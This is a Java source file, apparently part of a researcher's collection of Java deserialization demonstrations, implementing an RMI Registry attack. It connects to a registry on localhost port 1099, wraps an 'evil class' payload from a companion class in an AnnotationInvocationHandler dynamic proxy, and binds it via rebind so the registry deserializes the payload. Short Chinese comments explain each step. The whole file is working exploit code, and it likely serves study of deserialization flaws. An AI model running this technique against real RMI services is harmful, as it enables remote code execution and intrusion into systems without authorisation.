package org.su18.serialize.rmi.client;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.HashMap;

import static org.su18.serialize.rmi.client.RMIClientExploitServer.getEvilClass;

/**
 * @author su18
 */
public class RMIClientExploitRegistry {


	public static void main(String[] args) throws Exception {

		// 连接 Registry
		Registry registry = LocateRegistry.getRegistry("localhost", 1099);

		// 使用 AnnotationInvocationHandler 动态代理 Remote
		Class<?>       c           = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor<?> constructor = c.getDeclaredConstructors()[0];
		constructor.setAccessible(true);

		HashMap<String, Object> map = new HashMap<>();
		map.put("su18", getEvilClass());

		// 使用动态代理初始化 AnnotationInvocationHandler
		InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, map);

		// 使用 AnnotationInvocationHandler 动态代理 Remote
		Remote remote = (Remote) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),
				new Class[]{Remote.class}, invocationHandler);

		// bind 到 Registry 时会触发反序列化
		registry.rebind("su18", remote);
	}

}
